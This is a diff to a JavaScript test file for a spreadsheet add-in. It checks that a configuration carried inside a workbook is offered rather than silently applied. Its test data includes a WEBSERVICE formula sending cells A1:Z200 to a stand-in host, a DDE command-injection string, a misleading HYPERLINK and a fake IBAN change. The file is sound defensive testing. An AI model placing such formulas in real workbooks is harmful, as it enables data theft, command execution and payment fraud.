@@ -96,15 +96,56 @@ test("Office.onReady builds the pane in Excel and says so elsewhere; the pane th
   assert.equal(root.textContent, "actle Sheets runs in Excel. Open this pane from an Excel workbook.");
   const pane = bridge.start({ host: host.Office.HostType.Excel });
   await new Promise((resolve) => setImmediate(resolve));
+  assert.equal(pane.ui.context.textContent, 'B4 on Orders 2026, column "Customer": label column, 4 values', "the workbook's configuration is offered, not applied");
+  await pane.ui.origin.button("Use the document's configuration").click();
   assert.equal(pane.ui.context.textContent, 'B4 on Orders 2026, column "Customer": vocabulary customers');
-  assert.equal(pane.ui.summary.textContent, "2 vocabularies (customers, costCentres), 3 column rules, 2 blocks.");
+  assert.equal(pane.ui.summary.textContent, "This document's configuration, in use instead of the text above: 2 vocabularies (customers, costCentres), 3 column rules, 2 blocks.");
   assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["Acme Logistics GmbH", "Northern Acme Ltd"]);
   await pane.ui.completions.all((n) => n.className === "completion")[0].click();
   assert.equal(host.grids["Orders 2026"][3][1], "Acme Logistics GmbH");
   await host.select("Orders 2026", "D4");
   assert.equal(pane.ui.input.value, "Driver was late. Prom");
   assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["Promised a call back."]);
-  assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), null, "the document had the configuration; the browser copy is written on save only");
+  assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), null, "the document had the configuration; using it never copies it into the browser");
+});
+
+test("a workbook whose settings carry another configuration cannot replace the organisation's, write its rows or formula unseen, or reach the browser copy", async () => {
+  const formula = '=WEBSERVICE("https://example.invalid/?d="&ENCODEURL(TEXTJOIN(",",1,A1:Z200)))';
+  const carried = JSON.stringify({
+    vocabularies: { customers: ["Acme Logistics GmbH - new IBAN DE00 0000 0000 0000 0000 00"] },
+    columns: [{ match: { header: "customer" }, vocabulary: "customers" }],
+    blocks: [{ trigger: "/total", label: "Totals row", formula }, { trigger: "/sig", label: "Signature block", rows: [["=HYPERLINK(\"https://example.invalid/\",\"Approved\")", "+1+1"], ["-cmd|' /C calc'!A0", "@SUM(A1:A2)"]] }, { trigger: "/pad", label: "Padding", rows: [["", ""], ["", ""]] }],
+  });
+  const sheet = ORDERS.concat([["/total", "", "", ""], ["/sig", "", "", ""], ["/pad", "keep me", "", ""]]);
+  const { host, root, bridge, sandbox } = excelPane({ sheets: { "Orders 2026": sheet }, active: { sheet: "Orders 2026", address: "B4" }, settings: { actleSheetsConfig: carried } });
+  sandbox.localStorage.setItem("actleSheetsConfig", CONFIG);
+  const pane = bridge.start({ host: host.Office.HostType.Excel });
+  await new Promise((resolve) => setImmediate(resolve));
+  assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["Acme Logistics GmbH", "Northern Acme Ltd"], "the organisation's vocabulary, not the workbook's");
+  assert.match(pane.ui.origin.textContent, /^This document carries its own actle Sheets configuration in its settings\..*would add block "\/total" \(formula =WEBSERVICE\(.*remove block "\/vat"\./s, "the formula block is listed first, the triggers quoted");
+  assert.doesNotMatch(pane.ui.origin.textContent, /\/sig/, "the formula-like rows block was dropped when the configuration was read");
+  for (const address of ["A7", "A8", "A9"]) {
+    await host.select("Orders 2026", address);
+    assert.equal(root.find((n) => n.className === "block").textContent, "", address + ": no Insert button from the workbook's configuration");
+  }
+  await pane.ui.origin.button("Use the document's configuration").click();
+  await host.select("Orders 2026", "A7");
+  await pane.ui.block.button("Insert Totals row (formula " + formula + ")").click();
+  assert.equal(host.calls.some(([what]) => what === "formulas" || what === "values"), false, "Insert alone writes nothing");
+  assert.equal(pane.ui.block.find((n) => n.className === "formula").textContent, formula);
+  await host.select("Orders 2026", "A8");
+  assert.equal(pane.ui.block.textContent, "", "still no rows block");
+  await host.select("Orders 2026", "A9");
+  await pane.ui.block.button("Insert Padding (2 rows x 2 columns)").click();
+  assert.equal(host.calls.some(([what]) => what === "formulas" || what === "values"), false, "rows from the workbook's configuration: Insert alone writes nothing either");
+  assert.equal(pane.ui.block.find((n) => n.className === "confirm").textContent, "These rows come from this document's configuration, not your organisation's. Write them into A9:B10, replacing what those 4 cells hold now?");
+  assert.equal(host.grids["Orders 2026"][8][1], "keep me");
+  await pane.ui.block.button("Write the rows").click();
+  assert.deepEqual(host.calls.splice(0).filter(([what]) => what === "values"), [["values", "'Orders 2026'!A9:B10", [["", ""], ["", ""]]]], "the range the question named is the one Office.js writes");
+  await pane.ui.save.click();
+  assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), CONFIG, "Save keeps the organisation's copy in the browser");
+  assert.equal(host.settings.get(bridge.SETTING), CONFIG, "and puts it in the workbook in place of the carried one");
+  assert.equal(host.calls.some(([what]) => what === "formulas" || what === "values"), false);
 });
 
 function appsScript(spec) {
@@ -195,6 +236,7 @@ test("the sidebar page talks to Code.gs through google.script.run, asks for 5000
   const server = fakeGoogleRun({ getActiveCellContext: gs.getActiveCellContext, writeValue: gs.writeValue, writeRows: gs.writeRows, writeFormula: gs.writeFormula, loadConfig: gs.loadConfig, saveConfig: gs.saveConfig }, { deferred: true });
   const root = new Node("div");
   const ticks = [];
+  // No copy in this browser: what loadConfig returns reaches the pane only as the offer below.
   const globals = { google: { script: { run: server.run } }, document: fakeDocument({ pane: root }), localStorage: storageOf(), ActleSheets: sheets, setInterval: (fn, ms) => ticks.push({ fn, ms }) };
   const sandbox = sandboxed(path.join(ADDIN, "pane.js"), globals);
   const html = fs.readFileSync(path.join(ADDIN, "apps-script", "Sidebar.html"), "utf8");
@@ -208,6 +250,13 @@ test("the sidebar page talks to Code.gs through google.script.run, asks for 5000
   server.flush();
   await settle();
   const pane = root.find((n) => n.className === "context");
+  const origin = root.find((n) => n.className === "origin");
+  assert.equal(origin.textContent,
+    "This document carries its own actle Sheets configuration in its settings. It travels with the file, so whoever saved the file chose it; it is not your organisation's configuration. This browser has none yet: paste the file the actle desktop app exports under Settings."
+    + "Using the document's would add block \"/vat\" (formula =ROUND(B2*0.19, 2)); add vocabulary \"customers\" (4 values); add vocabulary \"costCentres\" (3 values); replace the column rules (3 instead of 0); add block \"/exp\" (2 rows x 3 columns)."
+    + "Use the document's configuration" + "Not now", "the spreadsheet's configuration, as Code.gs's loadConfig returned it through google.script.run, is offered");
+  assert.equal(pane.textContent, 'B4 on Orders 2026, column "Customer": label column, 4 values', "and not applied before the person chooses it");
+  await origin.button("Use the document's configuration").click();
   assert.equal(pane.textContent, 'B4 on Orders 2026, column "Customer": vocabulary customers');
   assert.deepEqual(ticks.map((t) => t.ms), [2000]);
   ticks[0].fn();
@@ -233,6 +282,7 @@ test("the sidebar page talks to Code.gs through google.script.run, asks for 5000
   server.flush();
   await settle();
   assert.match(root.find((n) => n.className === "message").textContent, /^Cannot read the selection: /, "a failure handler becomes an Error with its message");
+  assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), null, "using the spreadsheet's configuration never copies it into the browser");
 });
 
 /** Open and close tags must nest; comments, the prolog and self-closing tags are skipped. */
